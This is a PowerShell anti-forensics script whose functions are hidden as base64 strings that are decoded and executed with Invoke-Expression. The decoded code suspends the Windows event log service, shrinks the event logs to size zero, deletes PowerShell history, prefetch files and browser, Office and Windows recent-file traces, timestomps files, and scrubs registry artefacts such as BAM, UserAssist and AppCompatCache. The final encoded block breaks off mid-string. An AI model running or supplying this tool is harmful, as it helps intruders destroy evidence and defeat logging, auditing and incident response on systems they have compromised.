[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gQ2xlYXItRXZlbnRMb2dnaW5nIHsKICAgIGlmICghJChJbnZva2UtVG9rZW5NYW5pcHVsYXRpb24pKSB7CiAgICAgICAgcmV0dXJuICRmYWxzZQogICAgfQoKICAgICRldmVudExvZ1NvdXJjZXMgPSBHZXQtRXZlbnRMb2cgLUxpc3QKCiAgICAjIFNldHRpbmcgdGhlIGxpbWl0IGZvciB0b28gbG93IGFuZCBmb3JjaW5nIHRvIG5vdCBjcmVhdGUgbmV3IGV2ZW50cy4KICAgIGZvcmVhY2ggKCRzb3VyY2UgaW4gJGV2ZW50TG9nU291cmNlcykgewogICAgICAgIFNldC1JdGVtUHJvcGVydHkgIkhLTE06XFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxzZXJ2aWNlc1xldmVudGxvZ1wkKCRzb3VyY2UuTG9nKSIgLU5hbWUgTWF4U2l6ZSAtVHlwZSBEV09SRCAtVmFsdWUgMCAtRm9yY2UKICAgICAgICBTZXQtSXRlbVByb3BlcnR5ICJIS0xNOlxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcc2VydmljZXNcZXZlbnRsb2dcJCgkc291cmNlLkxvZykiIC1OYW1lIFJldGVudGlvbiAtVHlwZSBEV09SRCAtVmFsdWUgLTEgLUZvcmNlCiAgICB9CgogICAgcmV0dXJuICR0cnVlCn0KCgpmdW5jdGlvbiBJbnZva2UtU3VzcGVuZEV0dyB7CiAgICAkZXR3TWV0YWRhdGEgPSBAe30KCiAgICAjIEdldHRpbmcgdGhlIHJlbGV2ZW50IGZ1bmN0aW9ucy4KICAgICROdFN1c3BlbmRQcm9jZXNzQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBudGRsbC5kbGwgTnRTdXNwZW5kUHJvY2VzcwogICAgJE50U3VzcGVuZFByb2Nlc3NEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSkgKFtCb29sXSkKICAgICROdFN1c3BlbmRQcm9jZXNzID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJE50U3VzcGVuZFByb2Nlc3NBZGRyLCAkTnRTdXNwZW5kUHJvY2Vzc0RlbGVnYXRlKQoKICAgICMgR2V0dGluZyB0aGUgUElEIGFuZCB0aGUgcHJvY2VzcyBvYmplY3QuCiAgICAkZXZlbnRMb2dQaWQgPSBHZXQtV21pT2JqZWN0IC1DbGFzcyBXaW4zMl9TZXJ2aWNlIC1GaWx0ZXIgIk5hbWUgTElLRSAnZXZlbnRsb2cnIiB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IFByb2Nlc3NJZAogICAgJGV2ZW50TG9nUHJvY2VzcyA9IEdldC1Qcm9jZXNzIC1JZCAkZXZlbnRMb2dQaWQKICAgIAogICAgaWYgKCEkZXZlbnRMb2dQcm9jZXNzKSB7CiAgICAgICAgcmV0dXJuICRldHdNZXRhZGF0YQogICAgfQoKICAgICMgU3VzcGVuZGluZyB0aGUgcHJvY2Vzcy4KICAgICROdFN1c3BlbmRQcm9jZXNzLkludm9rZSgkKCRldmVudExvZ1Byb2Nlc3MuSGFuZGxlKSkKCiAgICAkZXR3TWV0YWRhdGFbInBpZCJdID0gJGV2ZW50TG9nUGlkCiAgICAkZXR3TWV0YWRhdGFbImNsZWFuVXBUeXBlIl0gPSAyCgogICAgV3JpdGUtSG9zdCAiWytdIEV0dyBwcm9jZXNzIHN1c3BlbmRlZCEiIC1Gb3JlZ3JvdW5kQ29sb3IgR3JlZW4KICAgIHJldHVybiAkZXR3TWV0YWRhdGEKfQoKCmZ1bmN0aW9uIEludm9rZS1SZXN0b3JlRXR3IHsKICAgIHBhcmFtICgKICAgICAgICBbSGFzaHRhYmxlXQogICAgICAgICRldHdNZXRhZGF0YQogICAgKQoKICAgIGlmICgkZXR3TWV0YWRhdGFbImNsZWFuVXBUeXBlIl0gLWVxIDIpIHsKCiAgICAgICAjIEdldHRpbmcgdGhlIHJlbGV2ZW50IGZ1bmN0aW9ucy4KICAgICAgICAkTnRSZXN1bWVQcm9jZXNzQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBudGRsbC5kbGwgTnRSZXN1bWVQcm9jZXNzCiAgICAgICAgJE50UmVzdW1lUHJvY2Vzc0RlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdKSAoW0Jvb2xdKQogICAgICAgICROdFJlc3VtZVByb2Nlc3MgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkTnRSZXN1bWVQcm9jZXNzQWRkciwgJE50UmVzdW1lUHJvY2Vzc0RlbGVnYXRlKQoKICAgICAgICAjIEdldHRpbmcgdGhlIHByb2Nlc3Mgb2JqZWN0LgogICAgICAgIGlmICgkZXR3TWV0YWRhdGFbInBpZCJdLkNvdW50IC1lcSAwKSB7CiAgICAgICAgICAgIHJldHVybiAkZmFsc2UKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgJGV2ZW50TG9nUHJvY2VzcyA9IEdldC1Qcm9jZXNzIC1JZCAkZXR3TWV0YWRhdGFbInBpZCJdCgogICAgICAgIGlmICghJGV2ZW50TG9nUHJvY2VzcykgewogICAgICAgICAgICByZXR1cm4gJGZhbHNlCiAgICAgICAgfQogICAgICAgIAogICAgICAgICMgUmVzdW1pbmcgdGhlIHByb2Nlc3MuCiAgICAgICAgJE50UmVzdW1lUHJvY2Vzcy5JbnZva2UoJCgkZXZlbnRMb2dQcm9jZXNzLkhhbmRsZSkpCiAgICB9CiAgICBlbHNlaWYgKCRldHdNZXRhZGF0YVsiY2xlYW5VcFR5cGUiXSAtZXEgMSkgewogICAgICAgIGlmICghJChJbnZva2UtVG9rZW5NYW5pcHVsYXRpb24pKSB7CiAgICAgICAgICAgIHJldHVybiAkZmFsc2UKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgJGV2ZW50TG9nU291cmNlcyA9IEdldC1FdmVudExvZyAtTGlzdAogICAgCiAgICAgICAgIyBSZXN0b3Jpbmcgb2xkIHNldHRpbmdzLgogICAgICAgIGZvcmVhY2ggKCRzb3VyY2UgaW4gJGV2ZW50TG9nU291cmNlcykgewogICAgICAgICAgICBTZXQtSXRlbVByb3BlcnR5ICJIS0xNOlxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcc2VydmljZXNcZXZlbnRsb2dcJCgkc291cmNlLkxvZykiIC1OYW1lIE1heFNpemUgLVR5cGUgRFdPUkQgLVZhbHVlICRldHdNZXRhZGF0YVskc291cmNlLkxvZ11bIk1heGltdW1LaWxvYnl0ZXMiXSAtRm9yY2UKICAgICAgICAgICAgU2V0LUl0ZW1Qcm9wZXJ0eSAiSEtMTTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XHNlcnZpY2VzXGV2ZW50bG9nXCQoJHNvdXJjZS5Mb2cpIiAtTmFtZSBSZXRlbnRpb24gLVR5cGUgRFdPUkQgLVZhbHVlICRldHdNZXRhZGF0YVskc291cmNlLkxvZ11bIk92ZXJmbG93QWN0aW9uIl0gLUZvcmNlCiAgICAgICAgfQogICAgfQogICAgZWxzZSB7CiAgICAgICAgV3JpdGUtSG9zdCAiWy1dIFVua25vd24gZXZlbnRsb2cgcmVzdG9yYXRpb24gbWV0aG9kLiIgLUZvcmVncm91bmRDb2xvciBSZWQKICAgICAgICByZXR1cm4gJGZhbHNlCiAgICB9CgogICAgcmV0dXJuICR0cnVlCn0KCgpmdW5jdGlvbiBHZXQtRXZlbnRMb2dzU2V0dGluZ3MgewogICAgJGV0d01ldGFkYXRhID0gQHt9CiAgICAKICAgICRldmVudExvZ1NvdXJjZXMgPSBHZXQtRXZlbnRMb2cgLUxpc3QKCiAgICAjIEdldHRpbmcgdGhlIGN1cnJlbnQgc2V0dGluZ3Mgb2YgZWFjaCBldmVudGxvZy4KICAgIGZvcmVhY2ggKCRzb3VyY2UgaW4gJGV2ZW50TG9nU291cmNlcykgewogICAgICAgICRldHdNZXRhZGF0YVskc291cmNlLkxvZ10gPSBAe30KICAgICAgICAkZXR3TWV0YWRhdGFbJHNvdXJjZS5Mb2ddWyJNYXhpbXVtS2lsb2J5dGVzIl0gPSAxMDI0ICogJHNvdXJjZS5NYXhpbXVtS2lsb2J5dGVzCiAgICAgICAgJGV0d01ldGFkYXRhWyRzb3VyY2UuTG9nXVsiT3ZlcmZsb3dBY3Rpb24iXSA9ICRzb3VyY2UuT3ZlcmZsb3dBY3Rpb24KICAgIH0KCiAgICAkZXR3TWV0YWRhdGFbImNsZWFuVXBUeXBlIl0gPSAxCiAgICByZXR1cm4gJGV0d01ldGFkYXRhCn0=")) | Invoke-Expression

# Files
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gQ2xlYXItRmlsZXMgewogICAgcGFyYW0gKAogICAgICAgIFtEYXRlVGltZV0KICAgICAgICAkdGltZSwKCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkZW5jb2RlZFBvd2Vyc2hlbGxIaXN0b3J5LAoKICAgICAgICBbU3RyaW5nXQogICAgICAgICR1c2VyLAoKICAgICAgICBbQm9vbGVhbl0KICAgICAgICAkcnVuQXNVc2VyLAoKICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJGV4Y2x1c2lvbnMKICAgICkKICAgICRyZXMgPSAkdHJ1ZQoKICAgIGlmICgtbm90ICRleGNsdXNpb25zLkNvbnRhaW5zKCJwc2hpc3RvcnkiKSkgewogICAgICAgIENsZWFyLVBvd2Vyc2hlbGwgJGVuY29kZWRQb3dlcnNoZWxsSGlzdG9yeSAkdXNlcgogICAgfQogICAgCiAgICBpZiAoLW5vdCAkZXhjbHVzaW9ucy5Db250YWlucygiaW5ldGNhY2hlIikpIHsKICAgICAgICBDbGVhci1JbmV0Q2FjaGUgJHRpbWUgJHVzZXIKICAgIH0KCiAgICBpZiAoLW5vdCAkZXhjbHVzaW9ucy5Db250YWlucygid2luZG93c2hpc3RvcnkiKSkgewogICAgICAgIENsZWFyLVdpbmRvd3NIaXN0b3J5ICR0aW1lICR1c2VyCiAgICB9CgogICAgaWYgKC1ub3QgJGV4Y2x1c2lvbnMuQ29udGFpbnMoIm9mZmljZWhpc3RvcnkiKSkgewogICAgICAgIENsZWFyLU9mZmljZUhpc3RvcnkgJHRpbWUgJHVzZXIKICAgIH0KICAgIAogICAgaWYgKC1ub3QgJGV4Y2x1c2lvbnMuQ29udGFpbnMoImNyeXB0bmV0Y2FjaGUiKSkgewogICAgICAgIENsZWFyLUNyeXB0TmV0VXJsQ2FjaGUgJHRpbWUgJHVzZXIKICAgIH0KCiAgICBpZiAoISRydW5Bc1VzZXIgLWFuZCAtbm90ICRleGNsdXNpb25zLkNvbnRhaW5zKCJwcmVmZXRjaCIpKSB7CiAgICAgICAgaWYgKCQoQ2xlYXItUHJlZmV0Y2hlcyAkdGltZSkgLWVxICRmYWxzZSkgewogICAgICAgICAgICAkcmVzID0gJGZhbHNlCiAgICAgICAgfQogICAgfQoKICAgIHJldHVybiAkcmVzCn0KCmZ1bmN0aW9uIENsZWFyLVBvd2Vyc2hlbGwgewogICAgcGFyYW0gKAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJGVuY29kZWRQb3dlcnNoZWxsSGlzdG9yeSwKCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkdXNlcgogICAgKQogICAgJHBvd2Vyc2hlbGxIaXN0b3J5RmlsZSA9ICJDOlxVc2Vyc1wkKCR1c2VyKVxBcHBEYXRhXFJvYW1pbmdcTWljcm9zb2Z0XFdpbmRvd3NcUG93ZXJTaGVsbFxQU1JlYWRMaW5lXENvbnNvbGVIb3N0X2hpc3RvcnkudHh0IgoKICAgICMgSWYgdGhlcmUgaXMgcG93ZXJzaGVsbCBoaXN0b3J5IGZpbGUgLSByZXBsYWNlIGl0IHdpdGggdGhlIHNhdmVkIGNvcHkuCiAgICBpZiAoJGVuY29kZWRQb3dlcnNoZWxsSGlzdG9yeSkgewogICAgICAgIFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJGVuY29kZWRQb3dlcnNoZWxsSGlzdG9yeSkpIHwgU2V0LUNvbnRlbnQgJHBvd2Vyc2hlbGxIaXN0b3J5RmlsZSAtRW5jb2RpbmcgdXRmOAogICAgfQp9CgpmdW5jdGlvbiBDbGVhci1QcmVmZXRjaGVzIHsKICAgIHBhcmFtICgKICAgICAgICBbRGF0ZVRpbWVdCiAgICAgICAgJHRpbWUKICAgICkKCiAgICAkcHJlZmV0Y2hlcyA9IEdldC1DaGlsZEl0ZW0gIkM6XFdpbmRvd3NcUHJlZmV0Y2giCgogICAgaWYgKCRwcmVmZXRjaGVzKSB7CgogICAgICAgICMgSXRlcmF0aW5nIHByZWZldGNoZXMuCiAgICAgICAgZm9yZWFjaCAoJHByZWZldGNoIGluICRwcmVmZXRjaGVzKSB7CiAgICAgICAgICAgICRkZWx0YSA9ICRwcmVmZXRjaC5DcmVhdGlvblRpbWUgLSAkdGltZQogICAgICAgICAgICAKICAgICAgICAgICAgIyBJZiB0aGUgcHJlZmV0Y2ggZmlsZSBjcmVhdGVkIHdpdGhpbiB0aGUgcmFuZ2Ugb2YgdGhlIHdhbnRlZCB0aW1lc3Bhbi4gLSByZW1vdmUgaXQuCiAgICAgICAgICAgIGlmICgkZGVsdGEgLWd0IDApIHsKICAgICAgICAgICAgICAgIFJlbW92ZS1JdGVtICRwcmVmZXRjaC5GdWxsTmFtZQogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBXcml0ZS1Ib3N0ICJbK10gUmVtb3ZlZCBwcmVmZXRjaCBhcnRpZmFjdHMhIiAtRm9yZWdyb3VuZENvbG9yIEdyZWVuCiAgICB9CiAgICBlbHNlIHsKICAgICAgICBXcml0ZS1Ib3N0ICJbLV0gQ291bGRuJ3QgcmVtb3ZlIHByZWZldGNoIGFydGlmYWN0cywgcmVydW4gYXMgYWRtaW4gb3IgZGVsZXRlIG1hbnVhbGx5LiIgLUZvcmVncm91bmRDb2xvciBZZWxsb3cKICAgICAgICByZXR1cm4gJGZhbHNlCiAgICB9CgogICAgcmV0dXJuICR0cnVlCn0KCmZ1bmN0aW9uIENsZWFyLUluZXRDYWNoZSB7CiAgICBwYXJhbSAoCiAgICAgICAgW0RhdGVUaW1lXQogICAgICAgICR0aW1lLAoKICAgICAgICBbU3RyaW5nXQogICAgICAgICR1c2VyCiAgICApCgogICAgJGluZXRDYWNoZUZvbGRlcnMgPSBHZXQtQ2hpbGRJdGVtICJDOlxVc2Vyc1wkKCR1c2VyKVxBcHBEYXRhXExvY2FsXE1pY3Jvc29mdFxXaW5kb3dzXElOZXRDYWNoZSIgLUZvcmNlIC1EaXJlY3RvcnkKCiAgICBpZiAoJGluZXRDYWNoZUZvbGRlcnMpIHsKCiAgICAgICAgZm9yZWFjaCAoJGluZXRDYWNoZUZvbGRlciBpbiAkaW5ldENhY2hlRm9sZGVycykgewoKICAgICAgICAgICAgaWYgKCRpbmV0Q2FjaGVGb2xkZXIuTmFtZSAtZXEgIkNvbnRlbnQuSUU1IikgewogICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgfQogICAgICAgICAgICAkaW5ldENhY2hlID0gR2V0LUNoaWxkSXRlbSAkaW5ldENhY2hlRm9sZGVyLkZ1bGxOYW1lIC1SZWN1cnNlIC1Gb3JjZSAtRmlsZQoKICAgICAgICAgICAgIyBJdGVyYXRpbmcgaW5ldCBjYWNoZS4KICAgICAgICAgICAgZm9yZWFjaCAoJGluZXQgaW4gJGluZXRDYWNoZSkgewogICAgICAgICAgICAgICAgaWYgKCRpbmV0Lk5hbWUgLWVxICJjb250YWluZXIuZGF0IikgewogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkZGVsdGEgPSAkaW5ldC5DcmVhdGlvblRpbWUgLSAkdGltZQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAjIElmIHRoZSBpbmV0IGNhY2hlIGZpbGUgY3JlYXRlZCB3aXRoaW4gdGhlIHJhbmdlIG9mIHRoZSB3YW50ZWQgdGltZXNwYW4uIC0gcmVtb3ZlIGl0LgogICAgICAgICAgICAgICAgaWYgKCRkZWx0YSAtZ3QgMCkgewogICAgICAgICAgICAgICAgICAgIFJlbW92ZS1JdGVtICRpbmV0LkZ1bGxOYW1lIC1Gb3JjZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBXcml0ZS1Ib3N0ICJbK10gUmVtb3ZlZCBpbmV0IGNhY2hlIGFydGlmYWN0cyEiIC1Gb3JlZ3JvdW5kQ29sb3IgR3JlZW4KICAgIH0KfQoKZnVuY3Rpb24gQ2xlYXItT2ZmaWNlSGlzdG9yeSB7CiAgICBwYXJhbSAoCiAgICAgICAgW0RhdGVUaW1lXQogICAgICAgICR0aW1lLAoKICAgICAgICBbU3RyaW5nXQogICAgICAgICR1c2VyCiAgICApCgogICAgJG9mZmljZUhpc3RvcnlQYXRoID0gIkM6XFVzZXJzXCQoJHVzZXIpXEFwcERhdGFcUm9hbWluZ1xNaWNyb3NvZnRcT2ZmaWNlXFJlY2VudCIKCiAgICBpZiAoLW5vdCAkKFRlc3QtUGF0aCAkb2ZmaWNlSGlzdG9yeVBhdGgpKSB7CiAgICAgICAgcmV0dXJuCiAgICB9CiAgICAKICAgICRvZmZpY2VIaXN0b3J5ID0gR2V0LUNoaWxkSXRlbSAkb2ZmaWNlSGlzdG9yeVBhdGgKCiAgICBpZiAoJG9mZmljZUhpc3RvcnkpIHsKCiAgICAgICAgIyBJdGVyYXRpbmcgb2ZmaWNlIGhpc3RvcnkuCiAgICAgICAgZm9yZWFjaCAoJGZpbGUgaW4gJG9mZmljZUhpc3RvcnkpIHsKCiAgICAgICAgICAgIGlmICgkZmlsZS5OYW1lIC1lcSAiaW5kZXguZGF0IikgewogICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJGRlbHRhID0gJGZpbGUuQ3JlYXRpb25UaW1lIC0gJHRpbWUKICAgICAgICAgICAgCiAgICAgICAgICAgICMgSWYgdGhlIG9mZmljZSBoaXN0b3J5IGZpbGUgY3JlYXRlZCB3aXRoaW4gdGhlIHJhbmdlIG9mIHRoZSB3YW50ZWQgdGltZXNwYW4uIC0gcmVtb3ZlIGl0LgogICAgICAgICAgICBpZiAoJGRlbHRhIC1ndCAwKSB7CiAgICAgICAgICAgICAgICBSZW1vdmUtSXRlbSAkZmlsZS5GdWxsTmFtZQogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBXcml0ZS1Ib3N0ICJbK10gUmVtb3ZlZCBvZmZpY2UgaGlzdG9yeSBhcnRpZmFjdHMhIiAtRm9yZWdyb3VuZENvbG9yIEdyZWVuCiAgICB9Cn0KCmZ1bmN0aW9uIENsZWFyLVdpbmRvd3NIaXN0b3J5IHsKICAgIHBhcmFtICgKICAgICAgICBbRGF0ZVRpbWVdCiAgICAgICAgJHRpbWUsCgogICAgICAgIFtTdHJpbmddCiAgICAgICAgJHVzZXIKICAgICkKCiAgICAkd2luZG93c0hpc3RvcnkgPSBHZXQtQ2hpbGRJdGVtICJDOlxVc2Vyc1wkKCR1c2VyKVxBcHBEYXRhXFJvYW1pbmdcTWljcm9zb2Z0XFdpbmRvd3NcUmVjZW50IiAtRmlsZSAtUmVjdXJzZQoKICAgIGlmICgkd2luZG93c0hpc3RvcnkpIHsKCiAgICAgICAgIyBJdGVyYXRpbmcgd2luZG93cyBoaXN0b3J5LgogICAgICAgIGZvcmVhY2ggKCRmaWxlIGluICR3aW5kb3dzSGlzdG9yeSkgewogICAgICAgICAgICAkZGVsdGEgPSAkZmlsZS5DcmVhdGlvblRpbWUgLSAkdGltZQogICAgICAgICAgICAKICAgICAgICAgICAgIyBJZiB0aGUgd2luZG93cyBoaXN0b3J5IGZpbGUgY3JlYXRlZCB3aXRoaW4gdGhlIHJhbmdlIG9mIHRoZSB3YW50ZWQgdGltZXNwYW4uIC0gcmVtb3ZlIGl0LgogICAgICAgICAgICBpZiAoJGRlbHRhIC1ndCAwKSB7CiAgICAgICAgICAgICAgICBSZW1vdmUtSXRlbSAkZmlsZS5GdWxsTmFtZQogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBXcml0ZS1Ib3N0ICJbK10gUmVtb3ZlZCB3aW5kb3dzIGhpc3RvcnkgYXJ0aWZhY3RzISIgLUZvcmVncm91bmRDb2xvciBHcmVlbgogICAgfQp9CgpmdW5jdGlvbiBDbGVhci1DcnlwdE5ldFVybENhY2hlIHsKICAgIHBhcmFtICgKICAgICAgICBbRGF0ZVRpbWVdCiAgICAgICAgJHRpbWUsCgogICAgICAgIFtTdHJpbmddCiAgICAgICAgJHVzZXIKICAgICkKCiAgICAkY3J5cHROZXRVcmxDYWNoZSA9IEdldC1DaGlsZEl0ZW0gIkM6XFVzZXJzXCQoJHVzZXIpXEFwcERhdGFcTG9jYWxMb3dcTWljcm9zb2Z0XENyeXB0bmV0VXJsQ2FjaGUiIC1GaWxlIC1SZWN1cnNlIC1Gb3JjZQoKICAgIGlmICgkY3J5cHROZXRVcmxDYWNoZSkgewoKICAgICAgICAjIEl0ZXJhdGluZyBjcnlwdG5ldCB1cmwgY2FjaGUuCiAgICAgICAgZm9yZWFjaCAoJGZpbGUgaW4gJGNyeXB0TmV0VXJsQ2FjaGUpIHsKICAgICAgICAgICAgJGRlbHRhID0gJGZpbGUuQ3JlYXRpb25UaW1lIC0gJHRpbWUKICAgICAgICAgICAgCiAgICAgICAgICAgICMgSWYgdGhlIGNyeXB0bmV0IHVybCBjYWNoZSBmaWxlIGNyZWF0ZWQgd2l0aGluIHRoZSByYW5nZSBvZiB0aGUgd2FudGVkIHRpbWVzcGFuLiAtIHJlbW92ZSBpdC4KICAgICAgICAgICAgaWYgKCRkZWx0YSAtZ3QgMCkgewogICAgICAgICAgICAgICAgUmVtb3ZlLUl0ZW0gJGZpbGUuRnVsbE5hbWUgLUZvcmNlCiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIFdyaXRlLUhvc3QgIlsrXSBSZW1vdmVkIGNyeXB0bmV0IHVybCBjYWNoZSBhcnRpZmFjdHMhIiAtRm9yZWdyb3VuZENvbG9yIEdyZWVuCiAgICB9Cn0KCmZ1bmN0aW9uIEludm9rZS1Mb2dGaWxlVG9TdG9tcCB7CiAgICBwYXJhbSAoCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkcm9vdEtleVBhdGgsCgogICAgICAgIFtTdHJpbmddCiAgICAgICAgJGZpbGVQYXRoCiAgICApCgogICAgIyBJbnB1dCB2YWxpZGF0aW9uLgogICAgaWYgKCEkKFRlc3QtUGF0aCAkcm9vdEtleVBhdGgpKSB7CiAgICAgICAgV3JpdGUtSG9zdCAiWy1dIENvbmZpZyBkb2Vzbid0IGV4aXN0LCBmb3IgdGhlIGZpcnN0IHRpbWUgcnVuIHRoaXMgcHJvZ3JhbSB3aXRoIHN0YXJ0LiIgLUZvcmVncm91bmRDb2xvciBSZWQKICAgICAgICByZXR1cm4gJGZhbHNlCiAgICB9CgogICAgaWYgKCEkc3RvbXBlZEZpbGVQYXRoKSB7CiAgICAgICAgV3JpdGUtSG9zdCAiWy1dIEZpbGUgZG9lc24ndCBleGlzdCwgZm9yIHRoZSBmaXJzdCB0aW1lIHJ1biB0aGlzIHByb2dyYW0gd2l0aCBzdGFydC4iIC1Gb3JlZ3JvdW5kQ29sb3IgUmVkCiAgICAgICAgcmV0dXJuICRmYWxzZQogICAgfQogICAgCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICIkKCRyb290S2V5UGF0aClcU3RvbXBlZEZpbGVzIikpIHsKICAgICAgICBOZXctSXRlbSAiJCgkcm9vdEtleVBhdGgpXFN0b21wZWRGaWxlcyIKICAgIH0KCiAgICAjIFNhdmluZyB0aGUgdGltZSBzdGFtcHMuCiAgICAkZmlsZUtleVBhdGggPSAiJCgkcm9vdEtleVBhdGgpXFN0b21wZWRGaWxlc1wkKCRmaWxlUGF0aCkiCiAgICAKICAgIGlmIChUZXN0LVBhdGggJGZpbGVLZXlQYXRoKSB7CiAgICAgICAgV3JpdGUtSG9zdCAiWy1dIEZpbGUgYWxyZWFkeSBzdG9tcGVkLiIgLUZvcmVncm91bmRDb2xvciBSZWQKICAgICAgICByZXR1cm4gJGZhbHNlCiAgICB9CiAgICBOZXctSXRlbSAKCiAgICAkc3RvbXBlZEZpbGVJbmZvID0gR2V0LUl0ZW0gJHN0b21wZWRGaWxlUGF0aAoKICAgIE5ldy1JdGVtUHJvcGVydHkgLVBhdGggJGZpbGVLZXlQYXRoIC1OYW1lICJDcmVhdGlvblRpbWUiIC1WYWx1ZSAkc3RvbXBlZEZpbGVJbmZvLkNyZWF0aW9uVGltZQogICAgTmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkZmlsZUtleVBhdGggLU5hbWUgIkxhc3RXcml0ZVRpbWUiIC1WYWx1ZSAkc3RvbXBlZEZpbGVJbmZvLkxhc3RXcml0ZVRpbWUKICAgIE5ldy1JdGVtUHJvcGVydHkgLVBhdGggJGZpbGVLZXlQYXRoIC1OYW1lICJMYXN0QWNjZXNzVGltZSIgLVZhbHVlICRzdG9tcGVkRmlsZUluZm8uTGFzdEFjY2Vzc1RpbWUKICAgIHJldHVybiAkdHJ1ZQp9CgpmdW5jdGlvbiBJbnZva2UtU3RvbXBGaWxlcyB7CiAgICBwYXJhbSAoCiAgICAgICAgW0hhc2h0YWJsZV0KICAgICAgICAkZmlsZXMKICAgICkKCiAgICAjIFN0b21waW5nIGV2ZXJ5IGZpbGUuCiAgICBpZiAoJGZpbGVzKSB7CiAgICAgICAgZm9yZWFjaCAoJGZpbGUgaW4gJGZpbGVzLktleXMpIHsKICAgICAgICAgICAgJGZpbGVJbmZvID0gR2V0LUl0ZW0gJGZpbGUKICAgICAgICAgICAgJGZpbGVJbmZvLkNyZWF0aW9uVGltZSA9ICRmaWxlc1skZmlsZV1bIkNyZWF0aW9uVGltZSJdCiAgICAgICAgICAgICRmaWxlSW5mby5MYXN0V3JpdGVUaW1lID0gJGZpbGVzWyRmaWxlXVsiTGFzdFdyaXRlVGltZSJdCiAgICAgICAgICAgICRmaWxlSW5mby5MYXN0QWNjZXNzVGltZSA9ICRmaWxlc1skZmlsZV1bIkxhc3RBY2Nlc3NUaW1lIl0KICAgICAgICB9CiAgICB9Cn0=")) | Invoke-Expression

# Registry
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gQ2xlYXItUmVnaXN0cnkgewogICAgcGFyYW0gKAogICAgICAgIFtEYXRlVGltZV0KICAgICAgICAkdGltZSwKCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICR1c2VycywKCiAgICAgICAgW0Jvb2xlYW5dCiAgICAgICAgJHJ1bkFzVXNlciwKICAgICAgICAKICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJGV4Y2x1c2lvbnMsCgogICAgICAgIFtTdHJpbmddCiAgICAgICAgJHJvb3RLZXlQYXRoCiAgICApCiAgICAkcmVzdWx0ID0gJHRydWUKCiAgICBpZiAoLW5vdCAkZXhjbHVzaW9ucy5Db250YWlucygidXNlcmFzc2lzdCIpKSB7CiAgICAgICAgQ2xlYXItVXNlckFzc2lzdCAkdGltZSAkdXNlcnMKICAgIH0KCiAgICBpZiAoLW5vdCAkZXhjbHVzaW9ucy5Db250YWlucygiY29tZGxnMzIiKSkgewogICAgICAgIENsZWFyLUNvbURsZzMyICRyb290S2V5UGF0aCAkdXNlcnMKICAgIH0KCiAgICBpZiAoISRydW5Bc1VzZXIpIHsKCiAgICAgICAgaWYgKC1ub3QgJGV4Y2x1c2lvbnMuQ29udGFpbnMoImJhbWtleSIpKSB7CiAgICAgICAgICAgIGlmICghJChDbGVhci1CYW1LZXkgJHRpbWUgJHVzZXJzKSkgewogICAgICAgICAgICAgICAgJHJlc3VsdCA9ICRmYWxzZQogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBpZiAoLW5vdCAkZXhjbHVzaW9ucy5Db250YWlucygiYXBwY29tcGF0Y2FjaGUiKSkgewogICAgICAgICAgICBDbGVhci1BcHBDb21wYXRDYWNoZSAiJCgkcm9vdEtleVBhdGgpXEFwcENvbXBhdENhY2hlIgogICAgICAgIH0KICAgIH0KCiAgICByZXR1cm4gJHJlc3VsdAp9CgpmdW5jdGlvbiBDbGVhci1CYW1LZXkgewogICAgcGFyYW0gKAogICAgICAgIFtEYXRlVGltZV0KICAgICAgICAkdGltZSwKCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICR1c2VycwogICAgKQogICAgCiAgICBpZiAoISQoSW52b2tlLVRva2VuTWFuaXB1bGF0aW9uKSkgewogICAgICAgIHJldHVybiAkZmFsc2UKICAgIH0KCiAgICAkYmFtS2V5ID0gIkhLTE06XFNZU1RFTVxDb250cm9sU2V0MDAxXFNlcnZpY2VzXGJhbVxTdGF0ZVxVc2VyU2V0dGluZ3MiCgogICAgZm9yZWFjaCAoJHVzZXIgaW4gJHVzZXJzKSB7CiAgICAgICAgJHNpZCA9ICQoTmV3LU9